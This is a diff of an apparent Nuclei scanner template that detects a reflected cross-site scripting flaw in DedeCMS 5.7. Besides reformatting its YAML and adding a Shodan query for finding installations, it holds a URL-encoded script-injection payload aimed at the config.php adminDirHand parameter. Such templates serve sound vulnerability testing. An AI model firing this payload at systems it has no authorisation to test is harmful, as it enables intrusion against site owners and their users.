@@ -1,5 +1,4 @@
 id: dedecms-config-xss
-
 info:
   name: DedeCMS 5.7 - Cross-Site Scripting
   author: ritikchaddha
@@ -16,29 +15,26 @@ info:
     cwe-id: CWE-79
     cpe: cpe:2.3:a:dedecms:dedecms:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
     max-request: 1
+    product: dedecms
+    shodan-query: http.html:"DedeCms"
     vendor: dedecms
-  tags: dedecms,xss,vuln
-
+    verified: true
+  tags: dedecms,vuln,xss
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/include/dialog/config.php?adminDirHand=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
+  - matchers:
+      - part: body
+        type: word
         words:
-          - "location='../../</script><script>alert(document.domain)</script>"
-
-      - type: word
-        part: header
+          - location='../../</script><script>alert(document.domain)</script>
+      - part: header
+        type: word
         words:
           - text/html
-
-      - type: status
-        status:
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/include/dialog/config.php?adminDirHand=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
